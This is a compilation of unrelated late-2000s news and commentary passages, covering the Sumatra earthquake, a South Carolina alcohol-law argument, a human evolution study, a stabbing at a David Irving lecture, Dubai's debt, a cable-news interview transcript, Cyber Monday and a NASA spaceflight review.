Another text was sent from the bowels of the Ambacang Hotel in Padang , but with a less happy outcome .
Rescuers tunnelled through the ruins of the Dutch colonial - era hotel yesterday after the message alerted them to eight people alive inside .
But sniffer dogs found no signs of life .
The Sumatra quake came hours after an 8.3 - magnitude earthquake in the South Pacific triggered a tsunami that killed at least 164 people in Samoa , American Samoa and Tonga .
A two - year British boy was among the dead , and the Foreign Office is still trying to trace up to 16 British tourists who are unaccounted for .
This weekend the international aid effort in Sumatra has begun in earnest , with military and commercial planesflying in food , water and medicines .
More than a dozen countries have aid workers on the ground , including doctors and engineers .
Britain has sent 60 firefighters and an RAF aircraft full of emergency supplies , while Australia has dispatched a naval vessel carrying a mobile hospital and a Sea King helicopter .
Already in Padang is an Oxfam team distributing clothes , tarpaulins and hygiene kits , while 16 search - and - rescue experts from the organisation Rapid - UK arrived on Friday , armed with thermal cameras and lifting gear .
Their presence was welcomed in Padang , where rescuers have been hampered by a lack of specialist skills and equipment .

The city of 900,000 people in West Sumatra province sits on one of the world 's most active seismic fault lines , but Wednesday 's quake – which was followed by a second powerful tremor on Thursday – was the biggest in memory .
It shook buildings hundreds of miles away , in Malaysia and Singapore .
In Padang , thousands of buildings , including hotels , hospitals , shopping malls , offices and mosques , were destroyed .
" The ground jumped up and down like this , " said the Ambacang 's general manager , Sarana Aji , gesticulating with his arms .
He told The Australian newspaper : " It sounds like a train or something , and I just ran like I have never run before . "
Up to 100 guests and visitors died when the hotel , which was popular with tourists , business people and government officials , collapsed .
" It swayed and groaned , and then it just went , " Mr Aji said .
" It took less than 30 seconds . "
The Ambacang was a prominent landmark in Padang , a city famous across Indonesia for its spicy cuisine and distinctive curved roofs .
On Wednesday the hotel was hosting a seminar on life insurance .
By Friday , rescuers shovelling through the tangled mountains of steel and masonry were giving up hope of finding more survivors when someone trapped inside texted a relative .
The message begged for help and implored : " Be careful that the excavator does n't cause the building to collapse on us . "
Arkamelvi Karmani , an army officer at the site , said the eight people were believed to be on the sixth floor .
But despite frantic efforts by search - and - rescue teams , who used backhoes and drills to penetrate thick slabs of concrete , they had not been found by nightfall .
As aid workers and government officials reached remote areas outside Padang , they found entire villages wiped out by landslides set off by the quake .
As many as 644 people from three villages in the Pariaman district , close to the earthquake 's epicentre , are believed to have been buried under mud and debris .
The death toll from other villages is still unclear .
Television footage shot from the air showed uprooted trees and a bare brown hillside where a village once stood .
In another spot , the remains of destroyed houses protruded from the mud , while other ruined homes hung precariously over the edge of a huge crater gouged through rice fields and forest .
Survivors in the outlying areas are still waiting for aid .
" We have not received a thing , " said Siti Armaini , sitting outside her wrecked home in Pariaman , about 25 miles north of Padang .
" We need food , clothes , blankets , milk .
It seems like the government has forgotten about us . "
Another local , Afiwardi , said it was too late for help .
Pointing past a landslide that had cut off a road , he said : " Do n't bother trying to bring aid up there .
Everyone is dead . "

Trackbacks Unconstitutional for South Carolina To Ban Alcohol Possession and Consumption by 18 - to - 20 - Year - Olds ?
S.C. Stats. §§ 63-19-2440 and - 2450 generally ban under - 21 - year - olds from possessing or consuming alcoholic beverages .
( There are some exceptions , including for consumption in religious ceremonies and in the minor 's parent 's home . )
But South Carolina Constitution , art .
XVII , § 14 provides , Every citizen who is eighteen years of age or older , not laboring under disabilities prescribed in this Constitution or otherwise established by law , shall be deemed sui juris and endowed with full legal rights and responsibilities , provided , that the General Assembly may restrict the sale of alcoholic beverages to persons until age twenty - one .
Last year , the South Carolina Supreme Court used the provision to Respondent further argues that § 16 - 23 - 30 violates the state constitution because the age group of 18 - to 20 - year - olds is being treated differently than adults aged 21 and above ....
Article XVII , § 14 , specifically makes reference to the fact the General Assembly can restrict the sale of alcoholic beverages to persons until age 21 .
By expressly allowing the regulation of the sale of alcoholic beverages to the 18 - to 20 - year - old age group and not stating any other situation in which the General Assembly may restrict the rights of this age group , the state constitution precludes the General Assembly from prohibiting this age group ’s possession of handguns .
See Hodges v. Rainey , 341 S.C. 79 , 533 S.E.2d 578 ( 2000 ) ( the canon of construction “ expressio unius est exclusio alterius ” or “ inclusio unius est exclusio alterius ” holds that “ to express or include one thing implies the exclusion of another , or of the alternative ” ) ; see also Strickland v. Strickland , 375 S.C. 76 , 650 S.E.2d 465 ( 2007 ) ( when interpreting a statute , the words must be given their plain and ordinary meaning without resorting to subtle or forced construction which limit or expand the statute ’s operation ) .
Last year , the South Carolina Supreme Court used the provision to strike down a ban on handgun possession by 18 - to - 20 - year - olds , reasoning as follows :
So while the constitutional provision expressly allows bans on sale of alcoholic beverages to under - 21 - year - olds , it does n't authorize bans on possession ( or for that matter bans on transfer other than by sale ) .
Two magistrate judges have indeed so held , and the logic strikes me as quite right , given the text of the provision and the reasoning in the handgun possession decision ( State v. Bolin ) .

Durham , NC - Although advances in medical care have improved standards of living over time , humans are n't entirely sheltered from the forces of natural selection , a new study shows .
" There is this idea that because medicine has been so good at reducing mortality rates , that means that natural selection is no longer operating in humans , " said Stephen Stearns of Yale University .
A recent analysis by Stearns and colleagues turns this idea on its head .
As part of a working group sponsored by the National Evolutionary Synthesis Center in Durham , NC , the team of researchers decided to find out if natural selection -- a major driving force of evolution -- is still at work in humans today .
The result ?
Human evolution has n't ground to a halt .
In fact , we 're likely to evolve at roughly the same rates as other living things , findings suggest .
Taking advantage of data collected as part of a 60 - year study of more than 2000 North American women in the Framingham Heart Study , the researchers analyzed a handful of traits important to human health .
By measuring the effects of these traits on the number of children the women had over their lifetime , the researchers were able to estimate the strength of selection and make short - term predictions about how each trait might evolve in the future .
After adjusting for factors such as education and smoking , their models predict that the descendents of these women will be slightly shorter and heavier , will have lower blood pressure and cholesterol , will have their first child at a younger age , and will reach menopause later in life .
" The take - home message is that humans are currently evolving , " said Stearns .
" Natural selection is still operating . "
The changes may be slow and gradual , but the predicted rates of change are no different from those observed elsewhere in nature , the researchers say .
" The evolution that 's going on in the Framingham women is like average rates of evolution measured in other plants and animals , " said Stearns .
" These results place humans in the medium - to - slow end of the range of rates observed for other living things , " he added .
" But what that means is that humans are n't special with respect to how fast they 're evolving .
They 're kind of average . "

Additional authors on the study were Sean Byars of Yale University , Douglas Ewbank of the University of Pennsylvania , and Diddahally Govindaraju of Boston University .
The team 's findings were published online in the October 19th issue of Proceedings of the National Academy of Sciences .

* If there 's one thing that causes almost as many disputes between couples as money , it 's music .
I have a friend who split from her boyfriend of several years after he told her it was sacrilege to do the washing - up while listening to Wagner 's Ring cycle .
My husband , a former NME writer , is not quite so bonkers – yet .
He owns thousands of rigorously ordered CDs and closets himself away to listen to favourite albums , like a monk doing a rosary in his cell .
In his preferred life he would own a nuclear bunker , the better to listen to Miles Davis and Bob Dylan in optimum acoustic conditions , without the disrespectful interruptions of his wife and infant boys .
I , meanwhile , own a couple of hundred chaotically stacked albums : Dolly Parton jostles up against Elgar and ELO .
I like talking to my friend with Johnny Cash growling in the background , or dancing in my bedroom to Blondie .
Thus divorce papers were almost served last year when , on a trip to LA , I tagged along to a concert with some friends .
I returned home and mentioned to my husband that I had seen Van Morrison perform Astral Weeks at the Hollywood Bowl – a performance that was re-enacted at the Albert Hall this weekend .
My spouse sunk his head in his hands and said , " I cycled 10 miles to buy that album at the age of 15 .
I have been a Van fan my entire lifetime .
He has n't ever sung Astral Weeks in its entirety live in concert and you – you – get to see him . "
The only words missing from the diatribe were , " You are not worthy . "
In what may be the latest sign of simmering tensions in Florida between two prominent racist skinhead groups , two men suffered knife wounds this week during a speech by Holocaust denying historian David Irving at a luxury Palm Beach County hotel .
Irving spoke to about three dozen invited guests in a conference room he booked at the Ritz - Carlton hotel south of Palm Beach .
During his talk on “ decoding the Nazi message , ” two men , Christopher Nachtman and John Kopko , stepped outside to argue and one of them pulled a knife , police say .
A fight ensued .
Furniture was broken and a carpet was bloodied .
Both men were taken to nearby hospitals for treatment of knife wounds .
No charges have been filed yet .
Irving is a longtime Holocaust revisionist .
In 2000 , he sued Emory University professor and Holocaust expert Deborah Lipstadt for libel in his homeland of Britain , after she accused of him of deliberate falsification .
A London court declared Irving a pro-Nazi anti-Semite and “ active Holocaust denier ” and ordered him to pay all court costs .
In 2006 , he was imprisoned in Austria after pleading guilty to telling audiences that there were no gas chambers in the Nazi concentration camp of Auschwitz .
Irving subsequently backed off those claims .
Earlier this year , he set up a website selling Nazi memorabilia .
His visit to South Florida was the latest on a surreptitious speaking tour in the United States , in which Irving informs attendees of his venue at the last minute so as to thwart protestors .
Irving told Florida television station WPBF that Kopko initiated the attack , and that the fight had nothing to do with his lecture .
He said his assistant witnessed the incident .
“ She said that she saw four people chasing one member of the audience out and beating him to the floor , and she said she thought they were going to kill him , but he pulled a knife from nowhere and stabbed one of these men repeatedly , ” he told the TV station .
“ It was a personal feud , apparently , which goes back over the years , and I gained the impression , or so I was told , that three or four of these people had come in there with the intention of roughing him up , ” he said .
He does n’t know Kopko personally , Irving added .
Postings on Stormfront , the leading white supremacist website , imply that Kopko , 43 , is associated with Crew 38 , the support group for the Confederate Hammerskins .
A Stormfront poster using the screen name of “ White Racialist ” wrote after the incident , “ John is a good man and a true soldier for the Cause , and has been for 20 + years …
As for the lowly coward that pushed a knife into John ’s BACK , no fate is too awful for you .
You have to try a lot harder than that to kill Crew 38 ! ”
Kopko was an official of the National Socialist White Workers Party in 1992 when he led a protest outside a West Palm Beach bookstore on the premise that the business sold pornographic material that promoted race mixing and homosexuality .
That same year , he tried to get neo -Nazi publications placed in Palm Beach County libraries .
A newspaper reported that he showed up at a meeting dressed like a Nazi storm trooper .
Nachtman , 31 , is a former member of the once - prominent neo -Nazi group , National Alliance .
He has used the screen name “ Blutfahne ” – German for “ blood flag ” – on Stormfront and VNN Forum .
The latter is an online forum of Vanguard News Network , whose motto is , “ No Jews .
Just right . ”
He also posts under the screen name “ Teutonic Legion ” on Stormfront , and his avatar is the Volksfront logo .
He has promoted Volksfront and Confederate Hammerskins events , and helped organize the February 2007 Volksfront Victory Achievement Conference in Missouri , where he spoke .
There have been numerous recent confrontations in central Florida that suggest a war is brewing between former longtime allies Volksfront and the Confederate Hammerskins .
Michael Lawrence , one of the original founders of the Confederate Hammerskins in 1987 , switched his allegiance to Volksfront in 2007 , and became the group ’s unofficial leader in Florida .
Randal Krager , who co-founded Volksfront in 1994 while serving a prison sentence , moved from Portland , Oregon , to Florida with his wife and son to live next door to Lawrence .
Since Lawrence ’s defection , his longtime friend and Confederate Hammerskins member , Richie Myers , has steadily gained power throughout the state as the group ’s Orlando leader .
Myers and his second - in - command , Coby Stonecypher , regularly associate with the Outlaws Motorcycle Club gang .
Lawrence and Krager do not .
A public indication of trouble brewing between Confederate Hammerskins and Volksfront appeared in a Stormfront posting advertising Volksfront ’s annual Martyr ’s Day event , to be held this year in Pensacola .
The announcement said the gathering was “ family friendly [ by that we mean no drunks , no non-racial ‘ clubs ’ , no deviate or degrading behavior ] . ”
Many readers took that as disapproval of outlaw motorcycle clubs attending recent white supremacist gatherings , which has happened at Confederate Hammerskins events .
A woman using the screen name of “ Vidgis ” hinted on Stormfront this week that the stabbing at Irving ’s lecture reflected an escalation in tensions between the two skinhead groups .
She wrote , “ … the saddest part is how the various White Pride organizations are at war with one another .
If we would turn that rage towards the real enemies , we ’d be making real progress . ”
Knifings and neo -Nazis are n’t the sorts of events or people that show up often in Manalapan , the affluent little coastal town where Irving spoke at the Ritz - Carlton .
It has been home to the likes of famed criminal defense lawyer F. Lee Bailey , New Age musician Yanni and boxing promoter Don King .
The 52 - room oceanfront mansion of the widow of publishing heir Randolph Hearst fetched $ 22 million at a foreclosure auction last year .
Monday ’s fracas presumably was an atypical event at the Ritz - Carlton , whose website says it “ has catered to the world ’s most discerning guests , ” and describes it as having “ refined beauty ” and a “ graceful atmosphere . ”
The presidential suite runs a cool $ 3,000 per night .
Hotel officials say the conference room where Irving spoke was reserved under the name of his book publisher in Great Britain , and they knew nothing about Irving .
Irving told local media that he was “ deeply ashamed that this happened . ”
CAZUCA , Colombia —
Tawny cinder - block homes cling to the hillside in this illegal shantytown south of Bogota .
The slum of Cazuca is home to about 60,000 residents but there are few schools and no pavement , running water or other basic services .
For years , the vacuum of government presence has often been filled by armed groups — paramilitary , guerilla and criminal gangs — that control the population through intimidation , extortion and violence .
Cazuca receives some of the largest numbers of displaced people in Colombia — a population estimated at more than 3 million — who flee their homes due to violence or threats .
Displaced peoples are thought to make up almost half of Cazuca ’s population , though exact numbers are hard to come by .
Displaced peoples are hard to calculate and census counts are challenging at best in an area where most residents are considered squatters .
Many sell fruits and food on street corners or take jobs as construction or domestic workers .
Youth have few opportunities here and are at great risk of being recruited by armed groups .
Often , refusal to join a group results in expulsion from Cazuca , or murder .
The human rights NGO Justicia y Vida estimated there were more than 600 selective murders of teens between 2001 and 2006 .
Though numbers are believed to have dropped significantly in the past few years , youth continue to live with the threat of gangs and other armed actors who often enforce social codes of conduct and " cleanse " Cazuca of teens considered a blight on the barrios .
Though police presence has increased in recent years , residents say armed groups continue to control the barrios and intimidate the population .
The office of the Human Rights Ombudsman of Soacha , the municipality that includes Cazuca , received complaints of 126 threats made against citizens in 2008 , and it ’s believed that many never announce threats made against them for fear of reprisal .
Amid the hardships , people have found innovative and resourceful ways to survive .
They often reconstruct their lives with next to nothing , improvise homes and often subsist on little more than a dollar a day .
LONDON 
The government of Dubai , in a blunt acknowledgment of the severity of its financial position , said on Wednesday that it had asked its banks for a six - month stay on its schedule of debt repayments .
The terse statement came in the middle of negotiations between creditors and Dubai World , the corporate arm of Dubai , which has led many of its most ambitious real estate projects , but is now struggling under the burden of $ 59 billion in liabilities .
For the banks that financed the debt - fueled ascent of Dubai  analysts ’ estimates put its total debt at about $ 80 billion  the move by Dubai to obtain a standstill highlights a truth that many in the region had been trying to make clear to bankers .
It is that Abu Dhabi , the oil - rich governing emirate of the United Arab Emirates , will not unconditionally bail out its more profligate neighbor .
Instead , a genuine restructuring of Dubai ’s debt , with pain being shared equally between Dubai and its bankers , needs to take place .
The news came as a shock to the markets as well as Dubai ’s bankers .
The bonds of Dubai World ’s property developer , Nakheel , dropped sharply and the cost of insuring against a Dubai government default soared .
Guest article by Mike Panic : Digital files affect almost every facet of our life these days .
We download MP3 files , subscribe to podcasts , shoot thousands upon thousands of digital photos , watch streaming TV and movies over the Internet and email documents back and forth .
All of this adds up to a lot of digital files , but for the most part they are n’t being utilized to their fullest potential , nor being stored in a secure location .
Furthermore , one person in the home can often only access them at any given time .
With a little help , you can easily automate the back up , storage and centralization of all your digital files and enjoy them in ways never before thought of .
Many homes now have multiple computers in them , a sign of the “ digital ” times and a testimonial to how much we use computers in our day to day lives ; but running multiple computers can cause confusion as to where files are stored , like music , for example .
iTunes brought us cheap , high quality , affordable music and a great application to manage it all ; but if all your music is on the computer in your home office and you want to listen to music in your living room on the home stereo , you are stuck burning CDs .
Again , this is not practical .
Centralizing your audio files in a manner that can push music to a Wi -Fi equipped audio receiver like the Yamaha Neo HD eliminates the need to burn CDs every time you want to listen to music in a place in your home that is n’t right in front of the computer holding the music .
Advancements in technology have dropped the price significantly in home accessories ; take digital picture frames , for example .
Many of them , like this 10 ” model from Kodak , are Wi-Fi equipped ; but rarely are they setup that way .
Most users find it ’s easier to just stick a memory card in them and forget it .
The problem with that is you ’re now limited to what is on the card .
Shoot new photos and want to show them off and you ’ll have to walk over to the frame , pull the card out , hook it up to your computer , transfer images onto it and then put it back in the frame .
This is not practical ; since there are automated ways to push files from a centralized location right to the frame via Wi -Fi .
Utilizing a network attached storage device ( NAS for short ) in the home , addresses issues like pushing photos to digital picture frames and having music available anywhere in the home that your Wi-Fi connection reaches .
Fortunately , running an NAS device is now more affordable than ever .
An NAS device is essentially a hard drive that plugs into your home router and can be accessed by any computer on your network , wired or wirelessly .
Western Digital ’s offering , called the My Book World Edition comes configured to handle home automation , file storage and back - up needs , essentially making it a media server , network backup device and central storage for all other digital files .
These features set it apart from other devices , and allow you to do them all more quickly , efficiently and automatically than ever before
One of the main features of the My Book World Edition is the ability to do automatic and continuous backups of multiple computers , taking the guesswork out of which external hard drive goes with each computer .
Simply install the software and it does everything else on a continual basis .
Furthermore , you can recover lost , deleted or missing files in a breeze with an intuitive interface .
Managing , automating and most importantly , having instant access to your digital files has never been easier .
With a little planning , some small investments in hardware and a few simple apps ( like VNC for your iPhone ) , taking total control of all things digital in your home , while automating back - up and pushing content out , has never been easier .

First the transcript of the exchange between Dan Savage and Keith Olbermann .
Saying the Democrats need to " Man up " , I would sugest that they woman up too , and do whatever it takes to prove to the voters that elections DO matter , instead of this crazy game where Republicans control the debate when they win elections AND when they lose .
But first , on to the show .
KO : " Congressman Bachmann , first , we might say she picked up where previous Republican zealots left off , except that some of her utterances seem exponentially more bizarre and even random .
Is there some sort of machine generating these remarks or is there actually a person there ? "
Dan Savage : " There 's actually a person there and that person is a big problem for the Republican party , and she 's symbolic of an even bigger problem for the Republican party .
They began 20 or 30 years ago pandering to the Religious right and the Religious right realized that it could just run it's own candidates , elect it 's own people and put the nuts in charge , and that 's what they 've done .
Michele Bachmann is a religious extremist and a nut and she 's the kind of person who once upon a time the Republicans could count on her vote and her support for saner , more middle of the road Republican candidates who could work with Democrats and were n't bat crap crazy and now she 's the ones who 's in there and they are stuck with her and her extremism . "
KO : " So she , uh , she hears voices and wrestles snakes and that sort of end of the spectrum here , you know , cause even in that area . . . "
Dan Savage : " And she sees every political dispute as this battle between good and evil , as some sort of apocolypse , and just ratchets up the rhetoric , we 've seen her do it in 2008 when she called for investigation into the Anti American attitudes of members of congress , uh , and all of her extreme remarks during the health care debate and the cap and trade debate , the last time she was talking about letting blood in the political battle it was the lock and load and armed and dangerous argument she was making about green house gas emissions .
She 's nuts . "
KO : " Well , yeah , but you wonder how many people are going to follow her in this , " Let 's all slit our wrists " idea ?
and another thing . . "
Dan Savage : " I think if they want to show their commitment they should start with their throats . "
KO : " We 'll just pass on that .
How , how do they twist the idea of , say , just to pick a figure out of a hat here , say , Jesus Christ and , you know , the Golden rule and taking care of , particularly the sick and turn this into opposition to health care .
IIn a sense , if they are trying to emulate Christ , if they can't personally heal disease and passers by , should they not be willing to help doctors do so ? "
Dan Savage : " I 'm sure they want to hear this from me because I 'm an avowed atheist but my dad was a Roman Catholic deacon and my mom was a lay minister and I went to the seminary and was confirmed in the Catholic church .
I 've read the bible backwards and forwards , and a lot in there , a lot Jesus had to say about taking care of the sick , housing the homeless , feeding the hungry , visiting and not executing the prisoner and nothing about capital gains tax cuts , nothing about denying health care to American families and American children and nothing about this sort of insane opposition to a democratically elected President .
They really have hijacked Christianity and are giving it a bad name .
The reason we see spikes I think in more and more people who no longer identify with any religious faith or belief is because now to say you 're Christian in America means now you are saying I am in the same boat , the same bat crap crazy boat as Michele Bachmann .
A lot of even nominal Christians would n't say that .
anymore , cultural Christians do n't want to say that anymore "
KO : " Strip the religion and stick to the ethics of religion which is often very simple even to people who do n't believe and , we do n't know anybody who would boo the late Senator Kennedy at the Shikowski town hall belong to the religious far right .
I mean , I got heat for saying Ronald reagan was a lousy President and I waited 4 or 5 years until he died to say it , just out of repect for the dead .
Are , have n't the ethics of these folks , the religious and non religious alike in this opposition just been all over the map ? "
Dan Savage : " When you have a party that claims to speak for God , claims that God is on it 's side , the rhetoric heats up and the anger heats up .
It 's not just a battle of ideas and positions and what 's good for America and bad for the country .
It 's a battle of what God wants and what God does n't want and you 're , and it 's easier to demogauge about your enemies and despise and to dehumanize in this really personal and viscious way , and the religious right is fomenting this kind of hatred in this country , and at our peril .
I really do think that the Michele Bachmann's of the world and the Glenn Beck's of the world are actively , conciously or subconciously trying to get , I 'm just going to say it , they are trying to get the President killed .
That 's why they 're setting this up as kill or be killed arguements .
He 's gonna kill you grandma , pull the plug on grandma , death panels children have to go in front of .
This kind of rhetoric , this paranoid style on the religious right , from the birchers to the birthers does n't usually end well , and we , somebody 's gotta put the brakes on it , and unfortunately , in the Republican party , there are no adults left in the room , there are only the Michele Bachmann 's and the Glenn Beck 's and the Rush Limbaugh 's running the show . "
KO : " The overall picture , help me out on this overall picture , and I 'm not gonna , only gonna moderate your remarks in this degree that not all of the Republicans are not in this view that you just expressed , but unfortunatly a lot of what you 're talking about you nailed perfectly , but this political strategy here which is , um , you polluted the waters here in this debate , the Republicans have , and now , okay , that 's done , let 's have a start over , let 's have a do over on the entire debate .
What is the political , um , linear thinking in that ?
We 're , I see a disconnect in between August and Septemeber . "
Dan Savage : " I think the Republicans are trying to use the Obama rope a dope strategy from the primaries , where they 're trying to lure him with his desire to be bipartisan and to seem like he 's crafting a concensus solution to the health care problem , trying to lure him back into a whole fresh round of this that will not end well .
A little , well , and for him and the Democrats .
The Democrats need to call their bluff and go it alone , and not be suckered into another whole , uh , to debate with the Republicans would , Republicans are not debating this in good faith "
KO : " And give this new meme of , as we 're hearing from Mr. Alexander , Senator Alexander , these phony town halls that THINO ( Town Hall In Name Only ) this is the new form of choice , Democrats get astroturfed by health insuranace employees shipped in buses and Republicans can only handle invited guest and friendly , I mean , is Mitch McConnel that much of a mommy , and why is John McCain participating , it might as well be scripted ? "
Dan Savage : " Well , that 's the Republican M.O. coming out of the Bush years .
You only put your folks in front of an invited crowd and friendly crowd and then you put the video out and you put out and make it look like there is some sort of national consensus , some national motion for your guy , for your candidate , for your position , and you know clearly they 're gonna send their thugs and their screamers to Democrats events to make Democrats positions look controversial .
The majority of the country wants health insurance reform , but there sending the birchers and birthers to these meeting to scream and yell and create the apppearance of controversy and the media , which is capped by it's uh , allegiance to always describing every debate as a 50/50 either or , they create the impression that there is a deadlock when there is not , and it is a very concious working around startegy on the part of Republican startegists . "
KO : " Where does it go from here because we 've heard Congressman King from Georgia , who is another whack job say we 're going to continue the town halls in September , when there are n't any town halls in September , when they get back to work .
And Senator Gregg has said he will use a ton of procedural motions to slow things up .
Do you have any idea where they are going to go next with this ? "
Dan Savage : " I do n't know where the R's are going to go next .
I know where the Dems are going to go next .
They need to man up themselves .
They need to call the bluff .
We need to end the filibuster .
We have majorities in the House and Senate , we have the Whitehouse and the American people sent Barack Obama to the Whitehouse and handed the majorities in the House and Senate to the Democrats because they wanted helath insurance reform , because they wanted a solution , and the Democrats have to get up off their knees and push it through , and then they can take all the credit or all the blame , and I think once it 's passed it 's going to be very popular , just as Medicare has been and still is , cause the reason why the Republican Michael Steele is out there insisting that he 's opposed to government run health care programs but he 's gonna protect Medicare which is a Government run health care program is because once it's enacted and once Americans see that the Government can run this well and provide health care and health insurance , uh , at a , in a way that private insurance has proved that they can not it 's going to be popular and it's going to give Democrats credit and they should have the courage to do it and go it alone .

As long as there has been online shopping , there has been Cyber Monday .
But is that now more virtual than real ?
Online retailers for the last decade have counted on the Monday after Thanksgiving to deliver for them what Black Friday does for bricks - and - mortar stores : a turbo boost into the holiday shopping season .
Online sales surged on that Monday as many people hopped on to their employers ’ fast Internet connections to do some holiday shopping when they returned to work after Thanksgiving .
But with more than 60 % of U.S. homes now sporting high - speed Internet access , more people are now flipping through those online catalogs at home , said Ken Cassar , vice president of Nielsen Co. 's online research division .
As a result , more online stores are n’t waiting until Monday to get the party going .
They ’re throwing their own Black Friday events .
Some , including Amazon.com Inc. , are doing deals every day this week .

That does n’t mean Cyber Monday will fade away , however .
That ’s because some people still shop at work , away from the prying eyes of family members .
It ’s now become more of a marketing hook that retailers want to keep alive .
“ Retailers liked the marketing focus , ” Cassar said .
“ It remains a big shopping day , but it ’s now fueled more by retailer marketing and promotion . ”
More merchants say they plan to offer some type of promotion , such as free shipping or extra discounts , on Monday , 87 % compared with 83 % last year , according to a survey by Shop.org , the online division of the National Retail Federation .
Shop.org has a Web page listing Cyber Monday specials offered by 650 of its member merchants .

The shipping promotions will probably come with fewer strings , said Scott Silverman , Shop.org ’s executive director .
Half of the online merchants planning to toss out the shipping charges said they would not impose conditions , such as minimum order amounts , up from 25 % of retailers in 2005 .
Whether that will help lift online retail sales this holiday is up for debate .
Shop.org , whose members tend to be bigger merchants , said a survey of 60 retailers showed 70 % of respondents expected online sales to grow this holiday over last year .
But Cassar expects sales to be flat this holiday after falling 6 % last year .
“ There is high optimism among larger retailers , ” he said , “ but very low optimism among smaller online retailers , who tend to struggle more . ”
A Nielsen survey found that 63 % of people are planning to buy online this holiday , compared with 71 % last year .
Of those planning to shop online , 31 % said they planned to spend more than $ 300 , down from 42 % last year .

Research firm ComScore , which tracks online spending , is projecting a paltry 3 % growth in holiday spending online , to $ 28.8 billion from $ 28 billion last year .
From Nov. 1 through Sunday , online sales ticked up just 2 % , compared with a 4 % decline in the same period last year .
“ Online spending this holiday season will likely be tempered by the stark reality of 10 % unemployment and less disposable income in many consumers ’ wallets , ” ComScore Chairman Gian Fulgoni said .

The peak times in which women report sexual harassment or assaults on the subways are the late morning rush , roughly 8 to 10 a.m. , followed by the early afternoon rush , 4 to 6 p.m .
One stretch of the subways  the crowded Nos. 4 , 5 and 6 lines between Grand Central Terminal and Union Square  is a particular source of complaints .
And the average age of the men arrested this year for sexual offenses on the subways is 39 .
These facts emerged Thursday during a joint hearing of three City Council committees 
Transportation , Women ’s Issues and Public Safety  and officials from the Police Department and the Metropolitan Transportation Authority to discuss a problem that has struck a chord with many subway riders , who say they have been ogled , groped , flashed , harassed and even attacked .
“ There is a clamor for more prevention and more enforcement , ” said Councilman John C. Liu , a Queens Democrat , who is chairman of the Transportation Committee and the city ’s comptroller - elect .
Forget all this talk about manned missions to Mars ; is it time to scale back US space plans and land on an asteroid instead , Armageddon style ?
Earlier this year , in response to a request from John Holdren , the White House 's Director of the Office of Science and Technology Policy , NASA empaneled a committee and charged them with evaluating the future of US manned space flight .
After a series of public meetings and the earlier release of an executive summary , its final report has been released .
The committee has concluded that NASA now has plans that do n't reflect any sort of budgetary reality , and suggests that a " flexible path " series of missions to asteroids and orbital LaGrange points as realistic goals for the next few decades .
Mars can wait .
Unsustainable
The committee is unsparing in its view of the US manned space program , from the first sentence onwards : " The US human spaceflight program appears to be on an unsustainable trajectory .
It is perpetuating the perilous practice of pursuing goals that do not match allocated resources . "
As that statement implies , the problems outlined by the committee are primarily financial .
NASA has currently budgeted for the decade under a few assumptions — the retirement of the space shuttle at the end of next year and the de-orbiting of the International Space Station in 2016 — that seem completely unrealistic .
The shuttle retirement date can only work if an aggressive mission schedule is kept through the remainder of this year and all of next .
At this point , keeping that schedule would require launches to continue at double the rate NASA has achieved since it restarted launches after the Columbia disaster .
NASA has also failed to budget any money for the actual act of deorbiting the ISS , although that 's probably not the worst of its problems .
The ISS has only just reached its full habitation capacity , and further additions are still planned .
That means we may end up with less than five years of it operating at planned capacity if deorbiting proceeds as scheduled .
The committee , in a fit of understatement , calls this a poor return on investment , and says that NASA needs a renewed focus on getting as much as it can out of what it has built .
In sum , the committee expects that both the shuttle and ISS will continue to eat into NASA 's budget for long after the current projections assume .
Unfortunately , future planned flights will require the development of the Ares / Orion series of vehicles , and their program budgets assume that the money currently devoted to the shuttle and ISS will become available .
The combination of that assumption being wrong with NASA 's need to plan for a flat budget more or less means that we 're not going anywhere .
" The heavy - lift vehicle , Ares V , is not available until the late 2020s , and there are insufficient funds to develop the lunar lander and lunar surface systems until well into the 2030s , if ever , " one section of the report concludes .
At best , an accelerated development schedule for the manned launch vehicle would see a seven - year gap between the retirement of the shuttle and the availability of a crewed replacement .
Given the increasingly international nature of space exploration , the committee found that acceptable , but felt that the US should seriously consider alternatives for putting humans into space , given that the service date for Ares I ( the intended replacement ) was likely to slip .
Their favored solution was a series of guaranteed contracts that would foster the development of a commercial alternative .
Any manned mission beyond Earth orbit , however , will require a heavy lift capability .
The committee considered a variety of options , including updating existing launch vehicles , creating an unmanned derivative of the shuttle , and the further development of the planned Ares V heavy lift vehicle .
Each of these was considered to have its strong points , but the language of the report makes it pretty clear that the committee would like to see a simplified version of the Ares V dubbed " Ares Light . "
This would sacrifice about 10 tons of lift capacity ( still leaving it with a hefty 140 metric tons ) , but enable it to carry both cargo and crew .
Combined with shifting smaller manned launch vehicles to the commercial sector , this would allow NASA to develop only a single new launch vehicle , which would have major budgetary and safety benefits .
This leaner approach — developing fewer vehicles and avoiding goals around hardware that may not materialize — extends to the advice on future missions .
Developing a crewed vehicle that can return astronauts from surfaces like that of the Moon or Mars is simply a challenge that NASA does n't have the money for .
As such , the report argues that we should be concentrating on a series of extended missions outside of Earth orbit that do n't necessarily involve human landings .
So , for example , a rendezvous with a near - Earth asteroid could provide a wealth of scientific data and practical experience with extended spaceflight without adding the challenge of a significant gravity field to overcome .
The report also suggests that human trips to stable orbital locations called LaGrange points are also in order .
We 're already placing astronomical observatories there , and the combination of heavy launch capabilities and manned intervention could make for equipment that rivals the Hubble in terms of continued scientific returns .
To Mars ! ( eventually )
This does n't mean giving up on Mars ; rather , " the Committee finds that Mars is the ultimate destination for human exploration of the inner solar system , but it is not the best first destination . "
Extended missions to the planet could involve landings on its moons or in - orbit control of rovers that have sample return capacity .
The report itself lays out a large variety of options , from vehicles to missions , but it 's clear where the preferences of its authors lie .
But even if the plans they outline are far more realistic than those that have been floated around NASA , there will still be serious challenges .
Even more conservative vehicle development plans will require a boost of $ 3 billion to NASA 's 2010 budget , and adjustments for inflation from then on .
And development of the Ares vehicles has already begun — there 's a test flight being prepped for launch at the moment — and may be difficult to change .
If nothing else , however , the report rightly focuses on the fact that NASA has been given a series of tasks it cannot possibly achieve , and it can only approach success by turning its back on the ISS , the structure it has spent the last several decades planning and building .
The Federal Communications Commission ( FCC ) has mounted a recent push to turn network neutrality " principles " into official regulations — and in doing so has stirred up the net neutrality hornet 's nest once again .
The issues involved are thorny when you wade deep into the weeds , but consumer - level support for network neutrality seems largely driven by simple principle : AT&T should not be " speeding up " websites with deep pockets , leaving everyone else to languish in the slow lane .
This was famously what AT&T Chairman Ed Whitacre wanted to do back in 2005 when he declared that Internet companies would not be able to " use my pipes free . "
